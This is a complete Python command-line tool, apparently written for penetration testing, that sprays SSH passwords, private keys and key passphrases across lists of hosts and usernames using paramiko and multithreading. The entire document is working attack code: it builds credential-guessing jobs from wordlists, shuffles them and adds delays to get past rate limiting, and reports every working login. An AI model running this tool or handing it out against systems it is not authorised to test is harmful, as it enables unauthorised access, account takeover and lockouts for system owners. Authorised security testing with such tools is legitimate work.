#!/usr/bin/env python3
"""
ssh_spray.py - SSH Authentication Testing Tool
Written by Moustafa Saleh (m0sa)

Test SSH keys and passwords against multiple hosts and users.
Supports both single targets and bulk testing from files.
Handles encrypted SSH keys with passphrases.
Uses multithreading for faster execution.

Usage:
    # Password authentication
    python3 ssh_spray.py -m 192.168.1.10 -u root -p 'password123'
    python3 ssh_spray.py -M hosts.txt -U users.txt -P passwords.txt -v
    
    # Key authentication - unencrypted
    python3 ssh_spray.py -M hosts.txt -U users.txt -k id_rsa
    
    # Key authentication - single passphrase
    python3 ssh_spray.py -M hosts.txt -U users.txt -k id_rsa -kp 'keypassword'
    
    # Key authentication - try multiple passphrases
    python3 ssh_spray.py -M hosts.txt -U users.txt -k id_rsa -KP passphrases.txt
    
    # Custom thread count (default is 10)
    python3 ssh_spray.py -M hosts.txt -U users.txt -P passwords.txt -T 20 -v
    
    # Add delay to avoid rate limiting (recommended for strict SSH servers)
    python3 ssh_spray.py -m 172.16.1.10 -U users.txt -k id_rsa -kp pass -d 0.5 -v

Requires: pip install paramiko
"""
import paramiko
import argparse
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import random
import time

# Thread-safe lock for printing
print_lock = threading.Lock()

# Track successful logins
successful_logins = []
success_lock = threading.Lock()

def load_private_key(key_file, passphrase=None):
    """Load private key with optional passphrase"""
    # First, check the key format
    try:
        with open(key_file, 'r') as f:
            key_content = f.read()
            
            # Detect key format
            if 'BEGIN OPENSSH PRIVATE KEY' in key_content:
                raise Exception(f"Key is in OpenSSH format. Convert to PEM format using:\n    ssh-keygen -p -m PEM -f {key_file}")
            elif 'BEGIN PRIVATE KEY' in key_content and 'BEGIN RSA PRIVATE KEY' not in key_content:
                # PKCS#8 format - try to give helpful error if it fails
                key_format_hint = f"Key is in PKCS#8 format. If loading fails, convert to traditional PEM format using:\n    ssh-keygen -p -m PEM -f {key_file}"
            else:
                key_format_hint = None
    except Exception as e:
        if "OpenSSH format" in str(e) or "PKCS#8 format" in str(e):
            raise e
        # If we can't read the file, let paramiko handle it
        key_format_hint = None
    
    # Try to load with different key types
    last_error = None
    
    try:
        # Try RSA key
        return paramiko.RSAKey.from_private_key_file(key_file, password=passphrase)
    except paramiko.ssh_exception.PasswordRequiredException:
        raise Exception("Key is encrypted but no passphrase provided")
    except Exception as e:
        last_error = e
    
    try:
        # Try DSA key
        return paramiko.DSSKey.from_private_key_file(key_file, password=passphrase)
    except Exception as e:
        last_error = e
    
    try:
        # Try ECDSA key
        return paramiko.ECDSAKey.from_private_key_file(key_file, password=passphrase)
    except Exception as e:
        last_error = e
    
    try:
        # Try Ed25519 key
        return paramiko.Ed25519Key.from_private_key_file(key_file, password=passphrase)
    except Exception as e:
        last_error = e
    
    # If all failed, provide helpful error message
    if key_format_hint:
        raise Exception(key_format_hint)
    else:
        raise Exception(f"Unable to load key. Try converting to PEM format:\n    ssh-keygen -p -m PEM -f {key_file}\nOriginal error: {str(last_error)}")

def test_ssh(host, user, key_file=None, key_passphrase=None, password=None, timeout=5, verbose=False, delay=0, pkey=None):
    """Test SSH connection with key or password"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if pkey:
            # Use pre-loaded key
            ssh.connect(host, username=user, pkey=pkey, timeout=timeout, banner_timeout=timeout)
        elif key_file:
            # Load key on demand (for multiple passphrases scenario)
            pkey_temp = load_private_key(key_file, key_passphrase)
            ssh.connect(host, username=user, pkey=pkey_temp, timeout=timeout, banner_timeout=timeout)
        else:
            # Password authentication
            ssh.connect(host, username=user, password=password, timeout=timeout, banner_timeout=timeout)
        
        # If we get here, connection succeeded
        success_msg = ""
        if key_file or pkey:
            if key_passphrase:
                success_msg = f"[+] SUCCESS (key+pass): {user}@{host} [passphrase worked]"
            else:
                success_msg = f"[+] SUCCESS (key): {user}@{host}"
        else:
            success_msg = f"[+] SUCCESS (pass): {user}@{host}"
        
        with print_lock:
            print(success_msg)
        
        # Record successful login
        with success_lock:
            successful_logins.append({
                'host': host,
                'user': user,
                'method': 'key' if (key_file or pkey) else 'password',
                'credential': 'key+passphrase' if (key_file and key_passphrase) else (password if password else 'key')
            })
        
        ssh.close()
        
        # Add delay after attempt if specified
        if delay > 0:
            time.sleep(delay)
        
        return True
    except paramiko.ssh_exception.SSHException as e:
        # Handle SSH-specific errors (banner, protocol, etc.)
        if verbose:
            error_type = "key" if (key_file or pkey) else "pass"
            error_msg = str(e)
            if "banner" in error_msg.lower() or "protocol" in error_msg.lower():
                with print_lock:
                    print(f"[-] Failed ({error_type}): {user}@{host} - Connection refused/rate limited")
            else:
                with print_lock:
                    print(f"[-] Failed ({error_type}): {user}@{host} - {error_msg}")
        
        # Add delay after failed attempt if specified
        if delay > 0:
            time.sleep(delay)
        
        return False
    except Exception as e:
        if verbose:
            error_type = "key" if (key_file or pkey) else "pass"
            with print_lock:
                print(f"[-] Failed ({error_type}): {user}@{host} - {str(e)}")
        
        # Add delay after failed attempt if specified
        if delay > 0:
            time.sleep(delay)
        
        return False

def read_file(filepath, description):
    """Read file and return non-empty lines"""
    if not os.path.exists(filepath):
        print(f"[!] Error: {description} file not found: {filepath}")
        sys.exit(1)
    
    with open(filepath) as f:
        lines = [line.strip() for line in f if line.strip()]
    
    if not lines:
        print(f"[!] Error: {description} file is empty: {filepath}")
        sys.exit(1)
    
    return lines

def main():
    parser = argparse.ArgumentParser(
        description='Test SSH key/password against multiple hosts and users'
    )
    
    parser.add_argument('-m', '--host', help='Single host to test')
    parser.add_argument('-M', '--hosts-file', help='File with list of hosts (one per line)')
    parser.add_argument('-u', '--user', help='Single username to test')
    parser.add_argument('-U', '--users', help='File with list of usernames (one per line)')
    parser.add_argument('-k', '--key', help='SSH private key file')
    parser.add_argument('-kp', '--key-passphrase', help='Single passphrase for encrypted SSH private key')
    parser.add_argument('-KP', '--key-passphrases', help='File with list of passphrases for encrypted SSH private key (one per line)')
    parser.add_argument('-p', '--password', help='Single password to test')
    parser.add_argument('-P', '--passwords', help='File with list of passwords (one per line)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('-T', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay in seconds between attempts (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show failed attempts')
    
    args = parser.parse_args()
    
    # Define authentication type flags
    key_auth = args.key is not None
    password_auth = args.password is not None or args.passwords is not None
    
    # Validation - hosts and users
    if not args.host and not args.hosts_file:
        parser.error("Must provide either -m/--host or -M/--hosts-file")
    if not args.user and not args.users:
        parser.error("Must provide either -u/--user or -U/--users")
    
    # Validation - authentication method (key OR password, not both)
    if not key_auth and not password_auth:
        parser.error("Must provide authentication: either -k/--key OR -p/--password OR -P/--passwords")
    
    if key_auth and password_auth:
        parser.error("Cannot mix key authentication (-k) with password authentication (-p/-P)")
    
    if (args.key_passphrase or args.key_passphrases) and not args.key:
        parser.error("-kp/--key-passphrase or -KP/--key-passphrases requires -k/--key to be specified")
    
    if args.key_passphrase and args.key_passphrases:
        parser.error("Cannot use both -kp/--key-passphrase and -KP/--key-passphrases together")
    
    if args.password and args.passwords:
        parser.error("Cannot use both -p/--password and -P/--passwords together")
    
    # Validation - thread count
    if args.threads < 1:
        parser.error("Thread count must be at least 1")
    
    # Validation - delay
    if args.delay < 0:
        parser.error("Delay cannot be negative")
    
    # Check if key file exists
    if args.key and not os.path.exists(args.key):
        print(f"[!] Error: SSH key file not found: {args.key}")
        sys.exit(1)
    
    # Read/prepare hosts
    hosts = []
    if args.host:
        hosts = [args.host]
    elif args.hosts_file:
        hosts = read_file(args.hosts_file, "Hosts")
    
    # Read/prepare users
    users = []
    if args.user:
        users = [args.user]
    elif args.users:
        users = read_file(args.users, "Users")
    
    # Prepare passwords list (only if password auth)
    passwords = []
    if password_auth:
        if args.password:
            passwords = [args.password]
        elif args.passwords:
            passwords = read_file(args.passwords, "Passwords")
    
    # Prepare key passphrases list (only if key auth)
    key_passphrases = [None]  # Default to None for unencrypted keys
    if key_auth:
        if args.key_passphrase:
            key_passphrases = [args.key_passphrase]
        elif args.key_passphrases:
            key_passphrases = read_file(args.key_passphrases, "Key passphrases")
    
    # Pre-load SSH key if using single passphrase (optimization)
    preloaded_key = None
    if key_auth and len(key_passphrases) == 1:
        try:
            print(f"[*] Loading SSH key: {args.key}")
            preloaded_key = load_private_key(args.key, key_passphrases[0])
            print(f"[*] SSH key loaded successfully!\n")
        except Exception as e:
            print(f"[!] Error loading SSH key: {e}")
            sys.exit(1)
    
    # Build list of test jobs - reordered to distribute load better
    # Order: user -> host -> password/passphrase
    # This spreads connections across different hosts instead of hammering one host
    test_jobs = []
    
    if key_auth:
        # Key authentication
        for user in users:
            for host in hosts:
                if preloaded_key:
                    # Use pre-loaded key (single passphrase or no passphrase)
                    test_jobs.append({
                        'host': host,
                        'user': user,
                        'pkey': preloaded_key,
                        'timeout': args.timeout,
                        'verbose': args.verbose,
                        'delay': args.delay
                    })
                else:
                    # Load key on demand (multiple passphrases)
                    for passphrase in key_passphrases:
                        test_jobs.append({
                            'host': host,
                            'user': user,
                            'key_file': args.key,
                            'key_passphrase': passphrase,
                            'timeout': args.timeout,
                            'verbose': args.verbose,
                            'delay': args.delay
                        })
    
    elif password_auth:
        # Password authentication
        for user in users:
            for host in hosts:
                for password in passwords:
                    test_jobs.append({
                        'host': host,
                        'user': user,
                        'password': password,
                        'timeout': args.timeout,
                        'verbose': args.verbose,
                        'delay': args.delay
                    })
    
    # Shuffle jobs to further distribute connections across hosts
    random.shuffle(test_jobs)
    
    # Execute tests with threading
    total_tests = len(test_jobs)
    print(f"[*] Starting {total_tests} tests with {args.threads} threads...")
    if args.delay > 0:
        print(f"[*] Using {args.delay}s delay between attempts to avoid rate limiting.")
    print(f"[*] Jobs randomized to distribute load across hosts.\n")
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(test_ssh, **job) for job in test_jobs]
        
        # Wait for all to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                with print_lock:
                    print(f"[!] Unexpected error: {e}")
    
    # Display summary
    print(f"\n{'='*60}")
    print(f"[*] Scan Complete!")
    print(f"[*] Total tests performed: {total_tests}")
    print(f"[*] Successful logins: {len(successful_logins)}")
    
    if successful_logins:
        print(f"\n[+] Successful Credentials:")
        for success in successful_logins:
            if success['method'] == 'key':
                print(f"    • {success['user']}@{success['host']} - SSH Key")
            else:
                print(f"    • {success['user']}@{success['host']} - Password: {success['credential']}")
    else:
        print(f"\n[-] No successful logins found.")
    
    print(f"{'='*60}")

if __name__ == '__main__':
    main()